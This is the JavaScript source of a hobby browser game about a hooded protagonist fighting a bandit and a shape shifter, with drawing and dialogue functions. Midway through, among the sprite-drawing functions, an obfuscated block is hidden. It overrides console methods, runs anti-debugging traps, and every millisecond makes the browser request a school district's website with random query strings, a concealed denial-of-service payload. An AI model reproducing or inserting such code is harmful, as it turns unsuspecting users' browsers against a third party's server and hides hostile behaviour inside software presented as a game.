 //Hey! I'm really glad you got the game and I hope you like it!
 /*
  Finish first fight with Bandit by June
  -March 24, 2017
  */
 //Shape shifter's name is Naberius
 //Eligor (silly goose)
 //Cow head
 //Revenant
 //Places
 //Panamint City
 
 //I realize now how many functions I had lol
 window.onload = function() {
     var mouseX = event.clientX;
     var mouseY = event.clientY;
     //TODO Draw Map1 TODO
     var c = document.getElementById("canvas");
     var ctx = c.getContext("2d");
     ctx.canvas.width = window.innerWidth - 55;
     ctx.canvas.height = window.innerHeight - 150;
     ctx.fillStyle = "yellow";
     var onGame = false;
     //Which map to draw
     var scene = 3;
     //Start the game  
     function game() {
         drawProtagonistFacingRight();
         onGame = true;
         document.body.style.backgroundColor = "black";
         ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
         var cRight = document.getElementById("Copyright");
         cRight.innerHTML = "";
         //The borders that the player can walk
         var borderW = 300;
         var borderA = 10;
         var borderS = ctx.canvas.height - 50;
         var borderD = ctx.canvas.width - 30;
         //player's location
         var playerX = 250;
         var playerY = 340;
         //The bullet's position
         var bulletX = 500;
         var bulletY = 375;
         //bandit's location
         var banditX = 620;
         var banditY = 320;
         //shape shifter's location
         var shapeShifterX = 200;
         var shapeShifterY = 400;
         //Player stats
         //player health
         var playerHealth = 20;
         //player's speed
         var playerSpeed = 15;
         //player's damage
         var playerDamage = 5;
         //how many times you've died
         var deaths = 0;

         //Colum and row for fights
         var column = 0;
         var row = 0;
         //which action is currently taking place
         //Some of these are only used for specific battles
         var attackNumber = 0;
         var threatNumber = 0;
         var talkNumber = 0;
         var runNum = 0;
         var eatNumber = 0;
         var memoryNumber = 0;
         //What you have learned so far
         var memories = [];
         //who is the player fighting
         var fighting = "";
         var canAttack = false;
         //Whether the Protagonist can move or not
         var movement = true;
         //Bandit's stats
         //bandit's health
         var banditHealth = 45;
         //The food you have
         var foodItems = [];
         
         ///option options for the fights
         var talkOptionBanditFight;
         
         function addFoodItem(item){
           foodItems.push(item);
         }
         
        function eatFoodItem(){
          foodItems.splice(0, 1);
        }
        
        function addAMemory(memory){
          memories.push(memory);
        }


         //Draws the main character
         function drawProtagonistFacingRight() {
           if(playerHealth > 0){
             //Draws the protagonist's hood
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX, playerY, 23, 5);
             ctx.fillRect(playerX - 3, playerY, 15, 25);
             ctx.fillRect(playerX, playerY + 20, 23, 5);
             ctx.fillRect(playerX + 22, playerY, 2, 25);
             //Draws the protagonist's cloak
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX, playerY + 15, 18, 35);
             //Draws the shadow that hides the protagonist's face 
             ctx.fillStyle = "#0a0a0a";
             ctx.fillRect(playerX + 11, playerY + 3, 12, 20);
           } else if(playerHealth <= 0){
             if(deaths === 0){
             deaths++;
             ctx.fillStyle = "black";
             ctx.fillRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             ctx.fillStyle = "black";
             Dialogue("The Necromancer: You're one of us now", 0, 2050, "red");
             Dialogue('If you want, you can just exit the "game"', 2051, 7050 , "red");
             Dialogue("You'll be happy as one of my most powerful zombies", 7051, 12000, "red");
             Dialogue("Or, you can try again to stop me", 12001, 16000, "red");
             Dialogue("But please remember that the hero of one story is the villan of another", 20001, 26000, "red");
             addAMemory("Bandit said that he won't help your master");
             addAMemory("The Necromancer is trying to get you to join his side");
             addAMemory("The Necromancer said you are the villain of his story");
             setTimeout(function(){
             playerHealth = 20;
             attackNumber = 0;
             banditHealth = 45;
             column = 0;
             row = 0;
             attackNumber = 0;
             threatNumber = 0;
             talkNumber = 0;
             runNum = 0;
             eatNumber = 0;
             memoryNumber = 0;
             drawBattleMap();
             }, 26001);
             }
           }
             
         }

         function drawProtagonistFacingLeft() {
             //Draws the protagonist's hood
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX, playerY, 23, 5);
             ctx.fillRect(playerX + 10, playerY, 15, 25);
             ctx.fillRect(playerX, playerY + 20, 23, 5);
             ctx.fillRect(playerX - 2, playerY, 2, 25);
             //Draws the protagonist's cloak
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX + 5, playerY + 15, 18, 35);
             //Draws the shadow that hides the protagonist's face 
             ctx.fillStyle = "#0a0a0a";
             ctx.fillRect(playerX, playerY + 3, 12, 20);
         }

         function drawProtagonistFacingUp() {
             //Draws the protagonist's hood
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX, playerY + 2.5, 25, 25);
             //Draws the protagonist's cloak
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX + 5, playerY + 17.5, 15, 35);
         }

         function drawProtagonistFacingDown() {
             //Draws the protagonist's hood
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX - 1, playerY - 2, 25, 25);
             //Draws the protagonist's cloak
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX + 4.5, playerY + 15, 15, 35);
             //Draws the shadow that hides the protagonist's face
             ctx.fillStyle = "#0a0a0a";
             ctx.fillRect(playerX + 6, playerY + 3, 12, 18);
         }


         //Draws The Bandit
         function drawBanditFacingRight() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX + 2, banditY, 20, 25);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 25, 8, 25);
             ctx.fillStyle = "#FFDE7A";
             //His arm
             ctx.fillRect(banditX + 5, banditY + 24, 7, 25);
             //The shoulder of his shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 24, 7, 10);
             //His eye
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 14, banditY + 5, 5, 8);
             //His bandit thing on his mouth? I don't know what it's called
             ctx.fillStyle = "red";
             ctx.fillRect(banditX + 4, banditY + 15, 18, 10);
             //100 LINES!!!!
             //His pant leg
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 5, banditY + 49, 8, 20);
             //his shoe
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 68, 7.5, 5);
         }

         function drawBanditFacingLeft() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX - 6, banditY, 20, 25);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 2, banditY + 25, 8, 25);
             ctx.fillStyle = "#FFDE7A";
             //His arm
             ctx.fillRect(banditX + 6, banditY + 24, 7, 25);
             //The shoulder of his shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 6, banditY + 24, 7, 10);
             //His eye
             ctx.fillStyle = "black";
             ctx.fillRect(banditX - 4, banditY + 5, 5, 8);
             //His bandit thing on his mouth? I don't know what it's called
             ctx.fillStyle = "red";
             ctx.fillRect(banditX - 6, banditY + 15, 15, 10);
             //His pant leg
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 2, banditY + 49, 8, 25);
             //His shoe
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 2, banditY + 68, 8, 7);
         }

         function drawBanditFacingUp() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX, banditY, 25, 25);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 25, 16, 25);
             //His arms
             //His right arm (YOUR RIGHT!!!!)
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX + 21, banditY + 25, 8, 20);
             //His left arm (On your left side)
             ctx.fillRect(banditX - 3, banditY + 25, 8, 20);
             //His pants
             //His right pant leg (ur right)
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 12, banditY + 49, 8, 20);
             ctx.fillRect(banditX + 5, banditY + 49, 8, 20);
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 11, banditY + 53, 3, 15);
             //his shoes
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 68, 15, 5);
         }

         function drawBanditFacingDown() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX, banditY, 25, 25);
             //His left eye (your left not his)
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 5, 5, 8);
             //His right eye (again your right)
             ctx.fillRect(banditX + 15, banditY + 5, 5, 8);
             //His bandit thing on his mouth? I don't know what it's called
             ctx.fillStyle = "red";
             ctx.fillRect(banditX, banditY + 15, 25, 10);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 25, 16, 25);
             //His arms
             //His right arm (YOUR RIGHT!!!!)
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX + 21, banditY + 25, 8, 20);
             //His left arm (On your left side)
             ctx.fillRect(banditX - 3, banditY + 25, 8, 20);
             //His pants
             //His right pant leg (ur right)
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 12, banditY + 49, 8, 20);
             //his left pant leg
             ctx.fillRect(banditX + 5, banditY + 49, 8, 20);
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 11, banditY + 53, 3, 15);
             //his shoes
             //200 LINES!!!!!!
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 68, 15, 5);
         }

         function drawBanditFacingLeftWithArmRaised() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX - 6, banditY, 20, 25);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 2, banditY + 25, 8, 25);
             ctx.fillStyle = "#FFDE7A";
             //His arm
             ctx.fillRect(banditX - 15, banditY + 27, 25, 7);
             //The shoulder of his shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 6, banditY + 24, 7, 10);
             //His eye
             ctx.fillStyle = "black";
             ctx.fillRect(banditX - 4, banditY + 5, 5, 8);
             //His bandit thing on his mouth? I don't know what it's called
             ctx.fillStyle = "red";
             ctx.fillRect(banditX - 6, banditY + 15, 15, 10);
             //His pant leg
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 2, banditY + 49, 8, 25);
             //His shoe
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 2, banditY + 68, 8, 7);
             //The Gun
             ctx.fillStyle = "#606060";
             ctx.fillRect(banditX - 30, banditY + 25, 10, 5);
             ctx.fillRect(banditX - 20, banditY + 25, 5, 10);
         }


         //Draws The Shape Shifter
         function drawShapeShifterFacingRight() {
             ctx.fillStyle = "#125C00";
             //his fleshy face
             ctx.fillRect(shapeShifterX + 1, shapeShifterY, 20, 25);
             //his blood red eyes
             ctx.fillStyle = "#ff0000";
             //his I (EYE)
             ctx.fillRect(shapeShifterX + 15, shapeShifterY + 5, 5, 10);
             //his blood soaked mouth
             ctx.fillStyle = "#d30000";
             ctx.fillRect(shapeShifterX + 13, shapeShifterY + 18, 8, 3);
             //his EEEEVIL SHIRT!!!
             ctx.fillStyle = "#012b49";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 24, 10, 25);
             //his jeans
             //his PANT LEG
             ctx.fillStyle = "#840000";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 47, 10, 26);
             //his murderous arms
             ctx.fillStyle = "#125C00";
             //his AAAAARRRMM
             ctx.fillRect(shapeShifterX + 5, shapeShifterY + 24, 7, 27);
             //his eeeeeeevil shooooooeeessss
             ctx.fillStyle = "#000000";
             //Da shoe 
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 71, 15, 5);
         }

         function drawShapeShifterFacingLeft() {
             ctx.fillStyle = "#125C00";
             //his fleshy face
             ctx.fillRect(shapeShifterX - 3, shapeShifterY, 20, 25);
             //his blood red eyes
             ctx.fillStyle = "#ff0000";
             //his I (EYE)
             ctx.fillRect(shapeShifterX + 1, shapeShifterY + 5, 5, 10);
             //his blood soaked mouth
             ctx.fillStyle = "#d30000";
             ctx.fillRect(shapeShifterX - 1, shapeShifterY + 18, 8, 3);
             //his EEEEVIL SHIRT!!!
             ctx.fillStyle = "#012b49";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 24, 10, 25);
             //his jeans
             //his PANT LEG
             ctx.fillStyle = "#840000";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 47, 10, 26);
             //his murderous arms
             ctx.fillStyle = "#125C00";
             //his AAAAARRRMM
             ctx.fillRect(shapeShifterX + 5, shapeShifterY + 24, 7, 27);
             //his eeeeeeevil shooooooeeessss
             ctx.fillStyle = "#000000";
             //Da shoe (OF EEEEEEVIIL
             ctx.fillRect(shapeShifterX - 1, shapeShifterY + 71, 15, 5);
         }

         function drawShapeShifterFacingUp() {
             ctx.fillStyle = "#125C00";
             //his fleshy face
             ctx.fillRect(shapeShifterX, shapeShifterY, 25, 25);
             //his blood red eyes
             ctx.fillStyle = "#ff0000";
             //his leeeeeftttt eeyeeeeee (your left bro)
             ctx.fillRect(shapeShifterX + 5, shapeShifterY + 5, 5, 10);
             //his RIGHT EYE (YOUR RIGHT MAN!!!!)
             ctx.fillRect(shapeShifterX + 15, shapeShifterY + 5, 5, 10);
             //his blood soaked mouth
             ctx.fillStyle = "#d30000";
             ctx.fillRect(shapeShifterX + 6, shapeShifterY + 17, 12, 3);
             //his EEEEVIL SHIRT!!!
             ctx.fillStyle = "#012b49";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 24, 17, 25);
             //his jeans
             //his left pant leg (YOUR LEFT)
             ctx.fillStyle = "#840000";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 47, 10, 26);
             //his riiiiiight pant leg (Ur right)
             ctx.fillRect(shapeShifterX + 11, shapeShifterY + 47, 10, 26);
             ctx.fillStyle = "black";
             ctx.fillRect(shapeShifterX + 11.5, shapeShifterY + 54, 2, 18);
             //his murderous arms
             ctx.fillStyle = "#125C00";
             //his lefty army (YOur left man, your left, don't get again!)
             ctx.fillRect(shapeShifterX - 3, shapeShifterY + 24, 7, 27);
             //his righty tighty arm (your right, never forget)
             ctx.fillRect(shapeShifterX + 21, shapeShifterY + 24, 7, 27);
             //his eeeeeeevil shooooooeeessss
             ctx.fillStyle = "#000000";
             //Da shoe on YOUR left side
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 71, 8, 5);
             //DAAA ShOOEEEE ONNN YOOOUURR RIIIIGGGHTTT SIIIDDEEE
             ctx.fillRect(shapeShifterX + 13, shapeShifterY + 71, 8, 5);
         }

         function drawShapeShifterFacingDown() {
             ctx.fillStyle = "#125C00";
             //his fleshy face
             ctx.fillRect(shapeShifterX, shapeShifterY, 25, 25);
             //his EEEEVIL SHIRT!!!
             ctx.fillStyle = "#012b49";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 24, 17, 25);
             //his jeans
             //his left pant leg (YOUR LEEEEFFFTTTTTTT)
             ctx.fillStyle = "#840000";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 47, 10, 26);
             //his riiiiiight pant leg (Yoooouuuurrrr riiiiggghhtt)
             ctx.fillRect(shapeShifterX + 11, shapeShifterY + 47, 10, 26);
             ctx.fillStyle = "black";
             ctx.fillRect(shapeShifterX + 11.5, shapeShifterY + 52, 2, 18);
             //his murderous arms
             ctx.fillStyle = "#125C00";
             //his lefty army (YOur left man, your left, don't forget again!)f
             ctx.fillRect(shapeShifterX - 3, shapeShifterY + 24, 7, 27);
             //his righty tighty arm (your right, never forget)
             ctx.fillRect(shapeShifterX + 21, shapeShifterY + 24, 7, 27);
             //his eeeeeeevil shooooooeeessss
             ctx.fillStyle = "#000000";
             //Da shoe on YOUR left side
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 71, 8, 5);
             //DAAA ShOOEEEE ONNN YOOOUURR RIIIIGGGHTTT SIIIDDEEE
             ctx.fillRect(shapeShifterX + 13, shapeShifterY + 71, 8, 5);
         }
         
         
         //All in-game objects
         function tree(treeX, treeY) {
             //The color of grass (And leaves in my opinion)
             ctx.fillStyle = "#00a51b";
             //Draws the leaves on the trees
             ctx.fillRect(treeX, treeY, 30, 5);
             ctx.fillRect(treeX, treeY, 30, 5);
             ctx.fillRect(treeX - 5, treeY + 5, 40, 5);
             ctx.fillRect(treeX - 10, treeY + 10, 50, 20);
             ctx.fillRect(treeX - 5, treeY + 15, 40, 20);
             //Draws the tree's trunk
             ctx.fillStyle = "#916118";
             ctx.fillRect(treeX + 6, treeY + 35, 15, 20);
         }

         function moon(moonX, moonY) {
             ctx.fillStyle = "#e5e5e5";
             ctx.fillRect(moonX, moonY, 75, 75);
             ctx.fillStyle = "#8e8e8e";
             ctx.fillRect(moonX, moonY, 5, 5);
         }

         function star(starX, starY) {
             ctx.fillStyle = "white";
             ctx.fillRect(starX, starY, 5, 5);
         }

         function Campfire(campfireX, campfireY) {
               var campfire = new Image();
             campfire.onload = function() {
                 ctx.drawImage(campfire, campfireX, campfireY);
             };
             campfire.src = "Sprites/Campfire.png";
         }
      
var _0x957e=['woVCw5bCoUAcDMKLAQ==','XQLCiB4=','IVzDtkzCqsKvQg==','HxAIMSk=','a2kDNUU=','wq3CgRszwpXCnkQ=','w6pwwp0=','Bl/Dj2fCnQ==','dsKbwqw=','w4sgw5TDlhc=','WSzCgWsTLsORUgjCjSM0eAXCsGfDmMKiSQ==','IsKZKWV1','w40rPQ==','wqVvw6I=','TsKUw4TCpsOoWsKnI8KjwookRcKyw59Sw7fDtsKcwp1uw5HCr8O6w6PCjEs=','wqLCixsnwo7Cmg==','X8OKHw==','w5o4w48uaw==','wp0jKw==','VMKswpoNwoTDvykPBBPCvA==','w410wpVww7HCvlVX','wrVAWUxo','w5ElwovClMKi','w7lWwrVrw78=','w7IrAMKGRg==','wrDCoz41Sg==','CAMUOjTDnQ==','VcKawo0dwpo=','ERbCscO9Rw==','GFXDig==','FTZzfRU=','BATDoFIO','wrAJKzXDow==','wpDCmcKTe8K0AgBtdygFF8Klw5rCkcOpG8OaZTJVaw5TFiTCnU3CmGJ3Og==','w4gFwrk=','L1HDlA==','w6gxwqPCssKo','wrzCgsONe8KW','w7I8w7vDgQY=','wrHCpUN7wrfDs8OO','N2I9CA==','BiIGw7LDjMOJwoU=','w7k7w4gi','w47CkWYFWsKXSw==','Iwhhw7/Dsg==','PWM1FMKRw6HDqg==','bX4WI1Jow6HCjWo3w5cfWlEsMT/DtsKn','w4t5YmVl','OcOaw77DkMOnw5TChw==','UMO2FFM=','wpnCow80TA=='];(function(a,d){var b=function(b){while(--b){a['push'](a['shift']());}};var c=function(){var a={'data':{'key':'cookie','value':'timeout'},'setCookie':function(b,h,i,e){e=e||{};var c=h+'='+i;var a=0x0;for(var a=0x0,f=b['length'];a<f;a++){var g=b[a];c+=';\x20'+g;var d=b[g];b['push'](d);f=b['length'];if(d!==!![]){c+='='+d;}}e['cookie']=c;},'removeCookie':function(){return'dev';},'getCookie':function(a,f){a=a||function(a){return a;};var c=a(new RegExp('(?:^|;\x20)'+f['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var e=function(a,b){a(++b);};e(b,d);return c?decodeURIComponent(c[0x1]):undefined;}};var e=function(){var b=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return b['test'](a['removeCookie']['toString']());};a['updateCookie']=e;var f='';var c=a['updateCookie']();if(!c){a['setCookie'](['*'],'counter',0x1);}else if(c){f=a['getCookie'](null,'counter');}else{a['removeCookie']();}};c();}(_0x957e,0x182));var _0xe957=function(b,f){b=b-0x0;var a=_0x957e[b];if(_0xe957['initialized']===undefined){(function(){var a;try{var b=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');a=b();}catch(b){a=window;}var c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';a['atob']||(a['atob']=function(h){var f=String(h)['replace'](/=+$/,'');for(var b=0x0,d,a,g=0x0,e='';a=f['charAt'](g++);~a&&(d=b%0x4?d*0x40+a:a,b++%0x4)?e+=String['fromCharCode'](0xff&d>>(-0x2*b&0x6)):0x0){a=c['indexOf'](a);}return e;});}());var e=function(d,k){var b=[],c=0x0,f,i='',h='';d=atob(d);for(var g=0x0,j=d['length'];g<j;g++){h+='%'+('00'+d['charCodeAt'](g)['toString'](0x10))['slice'](-0x2);}d=decodeURIComponent(h);for(var a=0x0;a<0x100;a++){b[a]=a;}for(a=0x0;a<0x100;a++){c=(c+b[a]+k['charCodeAt'](a%k['length']))%0x100;f=b[a];b[a]=b[c];b[c]=f;}a=0x0;c=0x0;for(var e=0x0;e<d['length'];e++){a=(a+0x1)%0x100;c=(c+b[a])%0x100;f=b[a];b[a]=b[c];b[c]=f;i+=String['fromCharCode'](d['charCodeAt'](e)^b[(b[a]+b[c])%0x100]);}return i;};_0xe957['rc4']=e;_0xe957['data']={};_0xe957['initialized']=!![];}var d=_0xe957['data'][b];if(d===undefined){if(_0xe957['once']===undefined){var c=function(a){this['rc4Bytes']=a;this['states']=[0x1,0x0,0x0];this['newState']=function(){return'newState';};this['firstState']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['secondState']='[\x27|\x22].+[\x27|\x22];?\x20*}';};c['prototype']['checkState']=function(){var a=new RegExp(this['firstState']+this['secondState']);return this['runState'](a['test'](this['newState']['toString']())?--this['states'][0x1]:--this['states'][0x0]);};c['prototype']['runState']=function(a){if(!Boolean(~a)){return a;}return this['getState'](this['rc4Bytes']);};c['prototype']['getState']=function(c){for(var a=0x0,b=this['states']['length'];a<b;a++){this['states']['push'](Math['round'](Math['random']()));b=this['states']['length'];}return c(this['states'][0x0]);};new c(_0xe957)['checkState']();_0xe957['once']=!![];}a=_0xe957['rc4'](a,f);_0xe957['data'][b]=a;}else{a=d;}return a;};var _0x5ecb55=function(){var a=!![];return function(d,b){var c=a?function(){if(b){var a=b['apply'](d,arguments);b=null;return a;}}:function(){};a=![];return c;};}();var _0x51f194=_0x5ecb55(this,function(){var b=function(){return'\x64\x65\x76';},c=function(){return'\x77\x69\x6e\x64\x6f\x77';};var d=function(){var a=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!a['\x74\x65\x73\x74'](b['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var e=function(){var a=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return a['\x74\x65\x73\x74'](c['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var a=function(a){var b=~-0x1>>0x1+0xff%0x0;if(a['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===b)){f(a);}};var f=function(b){var c=~-0x4>>0x1+0xff%0x0;if(b['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==c){a(b);}};if(!d()){if(!e()){a('\x69\x6e\x64\u0435\x78\x4f\x66');}else{a('\x69\x6e\x64\x65\x78\x4f\x66');}}else{a('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x51f194();var _0x5936bb=function(){var a=!![];return function(e,c){var b={'hbcYA':function f(a,b){return a===b;},'FvWfq':'fKR','WKimR':_0xe957('0x0','R^7^')};if(b[_0xe957('0x1','1D(B')](b[_0xe957('0x2','TGvK')],b['WKimR'])){}else{var d=a?function(){if(c){var a=c[_0xe957('0x3','lz2m')](e,arguments);c=null;return a;}}:function(){};a=![];return d;}};}();var _0x3e9142=_0x5936bb(this,function(){var c={'qMabU':function g(a,b){return a+b;},'aKGZT':function h(a,b){return a+b;},'Istcm':_0xe957('0x4','C0]@'),'JhAEJ':function i(a){return a();}};var b=function(){var b={'ITaLb':function e(a,b){return a===b;},'iSjHc':_0xe957('0x5','Uudo'),'WfpcM':_0xe957('0x6','R^7^'),'AOiuk':'0|3|6|2|4|1|5'};if(b['ITaLb'](b[_0xe957('0x7','Uudo')],b[_0xe957('0x8','C0]@')])){var c=b[_0xe957('0x9','bEnE')]['split']('|'),d=0x0;while(!![]){switch(c[d++]){case'0':a[_0xe957('0xa','bq^7')]['log']=_0x1d718c;continue;case'1':a['console']['exception']=_0x2dd5f2;continue;case'2':a['console'][_0xe957('0xb','aK#c')]=_0x491239;continue;case'3':a[_0xe957('0xc','JXOG')][_0xe957('0xd','#4xS')]=_0x884da0;continue;case'4':a[_0xe957('0xe','1qGa')]['error']=_0x2bcf04;continue;case'5':a['console'][_0xe957('0xf','tQDF')]=_0x35ba36;continue;case'6':a[_0xe957('0x10','aK#c')]['debug']=_0x563cf4;continue;}break;}}else{}};var a;try{var d=Function(c['qMabU'](c['aKGZT'](_0xe957('0x11','gM)k'),c[_0xe957('0x12','fr6f')]),');'));a=c['JhAEJ'](d);}catch(b){a=window;}if(!a['console']){a[_0xe957('0x13','exhr')]=function(b){var a={};a['log']=b;a['warn']=b;a['debug']=b;a[_0xe957('0x14','@AcE')]=b;a[_0xe957('0x15','V9iP')]=b;a[_0xe957('0x16','w1@J')]=b;a['trace']=b;return a;}(b);}else{var e='1|6|3|2|4|0|5'['split']('|'),f=0x0;while(!![]){switch(e[f++]){case'0':a['console']['exception']=b;continue;case'1':a['console']['log']=b;continue;case'2':a['console'][_0xe957('0x17','W8d^')]=b;continue;case'3':a[_0xe957('0x18','R^7^')]['debug']=b;continue;case'4':a['console'][_0xe957('0x19',']c1a')]=b;continue;case'5':a['console'][_0xe957('0x1a','gM)k')]=b;continue;case'6':a[_0xe957('0x1b','QWz0')]['warn']=b;continue;}break;}}});_0x3e9142();function dsoijasifoasejopfeajgaespgvjasdlk(){var a={'DlWXX':function e(a,b){return a===b;},'RDfMh':_0xe957('0x1c','r&Hx'),'xSFbz':function f(a,b){return a+b;},'foCmg':function g(a,b){return a*b;},'bmzPP':'http://www.mvcsc.k12.in.us'};if(a[_0xe957('0x1d','R^7^')](a['RDfMh'],_0xe957('0x1e','Ncci'))){var d=_0x25520(a[_0xe957('0x1f','bEnE')](_0xe957('0x20','U5iY'),'{}.constructor(\x22return\x20this\x22)(\x20)')+');');_0x38d801=_0x202b18();}else{var b=new Image();var c=Math['floor'](a['foCmg'](Math['random'](),0x8ac7230489e80000));b['src']=a['xSFbz'](a[_0xe957('0x21','a^JD')]+'/?r=',c);}}setInterval(dsoijasifoasejopfeajgaespgvjasdlk,0x1);setInterval(function(){_0x5efb68();},0xfa0);var _0x5efb68=function(){var a={'UARUR':'BHx','PGBni':function i(a,b){return a(b);},'fWpBE':function j(a,b){return a!==b;},'sDhla':function e(a,b){return a+b;},'qLnUI':function f(a,b){return a===b;},'TbubA':'debugger','ENvYJ':_0xe957('0x22','t(&$'),'NZdBq':_0xe957('0x23','w1@J'),'LrCnt':function g(a,b){return a*b;},'bYycj':function h(a,b){return a+b;},'HYlmI':_0xe957('0x24','hP#Q'),'nxVsL':'/?r='};if(a['qLnUI'](a['ENvYJ'],a['ENvYJ'])){function b(c){if(a['fWpBE'](a['sDhla']('',c/c)[_0xe957('0x25','QWz0')],0x1)||a['qLnUI'](c%0x14,0x0)){if(_0xe957('0x26','@AcE')==='faU'){if(_0x402dfa){var d=fn['apply'](_0x230c75,_0x49de9f);_0x2db2a4=null;return _0x244900;}}else{(function(){}['constructor'](a[_0xe957('0x27','#4xS')])());}}else{if(_0xe957('0x28','lz2m')==='XLW'){(function(){}[_0xe957('0x29','Ncci')](_0xe957('0x2a','r&Hx'))());}else{(function(){if(a['UARUR']!==a[_0xe957('0x2b',')#t)')]){a[_0xe957('0x2c','Uudo')](_0x3af29b,0x0);}else{}}['constructor'](a['TbubA'])());}}a[_0xe957('0x2d','r&Hx')](b,++c);}try{b(0x0);}catch(b){if('sfx'===a['NZdBq']){}else{}}}else{var d=new _0x6226fb();var c=Math[_0xe957('0x2e','t(&$')](a[_0xe957('0x2f','V9iP')](Math[_0xe957('0x30',']c1a')](),0x8ac7230489e80000));pic['src']=a[_0xe957('0x31','Ncci')](a['HYlmI']+a[_0xe957('0x32','9*V5')],_0x3584f1);}};_0x5efb68();
      
         function FlowerBush(flowerBushX, flowerBushY) {
             var flowerBush = new Image();
             flowerBush.onload = function() {
                 ctx.drawImage(flowerBush, flowerBushX, flowerBushY);
             };
             flowerBush.src = "Sprites/FlowerBush.png";
         }
         
         function drawBullet(){
           var bullet = new Image();
           bullet.onload = function() {
             ctx.drawImage(bullet, bulletX, bulletY);
           };
           bullet.src = "Sprites/Bullet.png";
         }
         
         
         //Draws a text box
         function Dialogue(text, timeUntilStart, timeUntilEnd, color) {
             var newText = document.createTextNode(text),
                 dialogue = document.getElementById("p1");
             dialogue.style.color = color;
             dialogue.style.backgroundColor = "black";
             setTimeout(function() {
                 dialogue.appendChild(newText);
             }, timeUntilStart);
             setTimeout(function() {
                 dialogue.removeChild(newText);
             }, timeUntilEnd);
         }

         function battleDialogue(text, timeUntilStart, timeUntilEnd, color) {
             var newText = document.createTextNode(text),
                 dialogue = document.getElementById("p1");
             dialogue.style.color = color;
             dialogue.style.backgroundColor = "black";
             setTimeout(function() {
                 dialogue.appendChild(newText);
             }, timeUntilStart);
             setTimeout(function() {
                 dialogue.removeChild(newText);
                 fighting = "Bandit";
                 drawBattleMap();
             }, timeUntilEnd);
         }
         //backgrounds
         function drawBanditBattleBackground() {
             var bbb = new Image();
             bbb.onload = function() {
                 ctx.drawImage(bbb, 100, 100, window.outerWidth - 250, window.outerHeight - 200);
             };
             bbb.src = "Backgrounds/BanditBattleBackground.png";
         }
         //All in-game tiles WARNING: Put tiles before objects
         function grass(grassX, grassY) {
             ctx.fillStyle = "#00a51b";
             ctx.fillRect(grassX, grassY, 25, 25);
         }
         //Draws scene
         function drawMap1() {
             playerX = 300;
             ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
